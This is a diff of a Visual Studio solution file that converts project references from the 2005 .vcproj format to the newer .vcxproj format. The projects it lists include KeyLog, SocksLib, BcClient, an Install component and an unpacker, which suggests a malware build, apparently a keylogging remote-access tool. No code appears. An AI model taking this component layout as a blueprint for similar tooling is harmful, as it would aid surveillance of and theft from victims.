@@ -1,7 +1,14 @@
 ﻿
-Microsoft Visual Studio Solution File, Format Version 9.00
-# Visual Studio 2005
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Install", "crm.vcproj", "{8512C569-BA17-4915-8258-D355B5E97A1D}"
+Microsoft Visual Studio Solution File, Format Version 12.00
+# Visual Studio Version 16
+VisualStudioVersion = 16.0.30517.126
+MinimumVisualStudioVersion = 10.0.40219.1
+Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Solution Items", "Solution Items", "{C8DF5787-326E-4FC3-85CA-D9CA2047DEBB}"
+	ProjectSection(SolutionItems) = preProject
+		ReadMe.txt = ReadMe.txt
+	EndProjectSection
+EndProject
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Install", "crm.vcxproj", "{8512C569-BA17-4915-8258-D355B5E97A1D}"
 	ProjectSection(ProjectDependencies) = postProject
 		{7B737A1E-DAA4-40D0-ACE7-3C32FD9884CA} = {7B737A1E-DAA4-40D0-ACE7-3C32FD9884CA}
 		{0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3} = {0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3}
@@ -9,7 +16,7 @@ Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Install", "crm.vcproj", "{8
 		{F7334E61-BDDF-4202-8411-7C2D81017C20} = {F7334E61-BDDF-4202-8411-7C2D81017C20}
 	EndProjectSection
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "client", "client\client.vcproj", "{F7334E61-BDDF-4202-8411-7C2D81017C20}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "client", "client\client.vcxproj", "{F7334E61-BDDF-4202-8411-7C2D81017C20}"
 	ProjectSection(ProjectDependencies) = postProject
 		{F46D43D2-C712-4455-B487-30DD680113A0} = {F46D43D2-C712-4455-B487-30DD680113A0}
 		{93C59580-5CBF-4ED6-848D-7BBD2E606CBB} = {93C59580-5CBF-4ED6-848D-7BBD2E606CBB}
@@ -23,62 +30,57 @@ Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "client", "client\client.vcp
 		{7B737A1E-DAA4-40D0-ACE7-3C32FD9884CA} = {7B737A1E-DAA4-40D0-ACE7-3C32FD9884CA}
 	EndProjectSection
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Common", "Common\Common.vcproj", "{0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Common", "Common\Common.vcxproj", "{0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3}"
 	ProjectSection(ProjectDependencies) = postProject
 		{38C8A58A-888D-43FA-AF71-E25FF845DA4A} = {38C8A58A-888D-43FA-AF71-E25FF845DA4A}
 	EndProjectSection
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "dname", "dname\dname.vcproj", "{87D3041D-88F6-411D-9E85-D0E6A6BD8131}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "dname", "dname\dname.vcxproj", "{87D3041D-88F6-411D-9E85-D0E6A6BD8131}"
 	ProjectSection(ProjectDependencies) = postProject
 		{0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3} = {0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3}
 	EndProjectSection
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "rsakey", "RsaKey\RsaKey.vcproj", "{93C59580-5CBF-4ED6-848D-7BBD2E606CBB}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "rsakey", "RsaKey\RsaKey.vcxproj", "{93C59580-5CBF-4ED6-848D-7BBD2E606CBB}"
 	ProjectSection(ProjectDependencies) = postProject
 		{38C8A58A-888D-43FA-AF71-E25FF845DA4A} = {38C8A58A-888D-43FA-AF71-E25FF845DA4A}
 		{0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3} = {0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3}
 		{F2D50E9F-0FAF-410F-9067-6C8A927F76E9} = {F2D50E9F-0FAF-410F-9067-6C8A927F76E9}
 	EndProjectSection
 EndProject
-Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Solution Items", "Solution Items", "{C8DF5787-326E-4FC3-85CA-D9CA2047DEBB}"
-	ProjectSection(SolutionItems) = preProject
-		ReadMe.txt = ReadMe.txt
-	EndProjectSection
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "zconv", "zconv\zconv.vcxproj", "{6B0802A4-3B3E-4B44-B3CE-E09B7E62A054}"
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "zconv", "zconv\zconv.vcproj", "{6B0802A4-3B3E-4B44-B3CE-E09B7E62A054}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Crypto", "crypto\crypto.vcxproj", "{38C8A58A-888D-43FA-AF71-E25FF845DA4A}"
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Crypto", "crypto\crypto.vcproj", "{38C8A58A-888D-43FA-AF71-E25FF845DA4A}"
-EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "KeyLog", "KeyLog\KeyLog.vcproj", "{CEC52CA8-10B4-4F71-8E87-5F66289F8708}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "KeyLog", "KeyLog\KeyLog.vcxproj", "{CEC52CA8-10B4-4F71-8E87-5F66289F8708}"
 	ProjectSection(ProjectDependencies) = postProject
 		{E62F67A8-EF4A-4CCF-95FC-77CA097CB3C7} = {E62F67A8-EF4A-4CCF-95FC-77CA097CB3C7}
 		{0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3} = {0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3}
 	EndProjectSection
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Handle", "Handle\Handle.vcproj", "{E62F67A8-EF4A-4CCF-95FC-77CA097CB3C7}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Handle", "Handle\Handle.vcxproj", "{E62F67A8-EF4A-4CCF-95FC-77CA097CB3C7}"
 	ProjectSection(ProjectDependencies) = postProject
 		{0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3} = {0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3}
 	EndProjectSection
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "BcClient", "BcClient\bcclient.vcproj", "{DD4E27EF-C0C3-42D4-894A-BCE5F4466A86}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "BcClient", "BcClient\bcclient.vcxproj", "{DD4E27EF-C0C3-42D4-894A-BCE5F4466A86}"
 	ProjectSection(ProjectDependencies) = postProject
 		{0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3} = {0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3}
 	EndProjectSection
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "SocksLib", "SocksLib\socks.vcproj", "{243BE6F4-D209-4F2E-A9DA-A9E085F666A8}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "SocksLib", "SocksLib\socks.vcxproj", "{243BE6F4-D209-4F2E-A9DA-A9E085F666A8}"
 	ProjectSection(ProjectDependencies) = postProject
 		{DD4E27EF-C0C3-42D4-894A-BCE5F4466A86} = {DD4E27EF-C0C3-42D4-894A-BCE5F4466A86}
 		{0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3} = {0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3}
 	EndProjectSection
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "AcDll", "AcDll\AcDll.vcproj", "{7B737A1E-DAA4-40D0-ACE7-3C32FD9884CA}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "AcDll", "AcDll\AcDll.vcxproj", "{7B737A1E-DAA4-40D0-ACE7-3C32FD9884CA}"
 	ProjectSection(ProjectDependencies) = postProject
 		{0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3} = {0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3}
 	EndProjectSection
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ApDepack", "apdepack\apdepack.vcproj", "{F2D50E9F-0FAF-410F-9067-6C8A927F76E9}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ApDepack", "apdepack\apdepack.vcxproj", "{F2D50E9F-0FAF-410F-9067-6C8A927F76E9}"
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Dll", "dll.vcproj", "{27DE3D2D-10EB-4227-9298-E2458CBC55B3}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Dll", "dll.vcxproj", "{27DE3D2D-10EB-4227-9298-E2458CBC55B3}"
 	ProjectSection(ProjectDependencies) = postProject
 		{F2D50E9F-0FAF-410F-9067-6C8A927F76E9} = {F2D50E9F-0FAF-410F-9067-6C8A927F76E9}
 		{F7334E61-BDDF-4202-8411-7C2D81017C20} = {F7334E61-BDDF-4202-8411-7C2D81017C20}
@@ -87,7 +89,7 @@ Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Dll", "dll.vcproj", "{27DE3
 		{7B737A1E-DAA4-40D0-ACE7-3C32FD9884CA} = {7B737A1E-DAA4-40D0-ACE7-3C32FD9884CA}
 	EndProjectSection
 EndProject
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ZipLib", "ZipLib\ZipLib.vcproj", "{F46D43D2-C712-4455-B487-30DD680113A0}"
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ZipLib", "ZipLib\ZipLib.vcxproj", "{F46D43D2-C712-4455-B487-30DD680113A0}"
 	ProjectSection(ProjectDependencies) = postProject
 		{0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3} = {0E4837EE-E3C4-46E2-BC2D-DD5B46E3F1C3}
 	EndProjectSection
@@ -390,5 +392,8 @@ Global
 	EndGlobalSection
 	GlobalSection(SolutionProperties) = preSolution
 		HideSolutionNode = FALSE
+	EndGlobalSection
+	GlobalSection(ExtensibilityGlobals) = postSolution
+		SolutionGuid = {4038CCE6-62F4-4684-8F42-0CA65BEE8CAB}
 	EndGlobalSection
 EndGlobal
